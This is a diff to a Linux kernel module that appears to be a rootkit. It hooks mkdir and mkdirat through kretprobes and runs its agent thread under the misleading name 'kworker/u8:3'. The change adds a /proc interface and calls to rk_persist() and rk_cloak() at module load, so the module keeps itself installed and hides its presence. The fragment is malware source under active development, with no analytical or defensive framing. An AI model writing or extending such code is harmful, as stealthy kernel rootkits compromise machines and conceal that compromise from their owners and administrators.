@@ -75,7 +75,9 @@ static int __init rk_init(void)
 	if (ret)
 		goto fail_mkdirat;
 
-	rk_target_add(&rk_content_targets, "rklings");
+	ret = rk_proc_init();
+	if (ret)
+		goto fail_proc;
 
 	rk_thread = kthread_run(rk_agent_thread, NULL, "kworker/u8:3");
 	if (IS_ERR(rk_thread)) {
@@ -84,9 +86,13 @@ static int __init rk_init(void)
 		goto fail_thread;
 	}
 
+	rk_persist();
+	rk_cloak();
 	return 0;
 
 fail_thread:
+	rk_proc_exit();
+fail_proc:
 	unregister_kretprobe(&rk_mkdirat_probe);
 fail_mkdirat:
 	unregister_kretprobe(&rk_mkdir_probe);
@@ -109,6 +115,7 @@ static void __exit rk_exit(void)
 	if (rk_thread)
 		kthread_stop(rk_thread);
 
+	rk_proc_exit();
 	rk_uncloak();
 
 	unregister_kretprobe(&rk_mkdirat_probe);
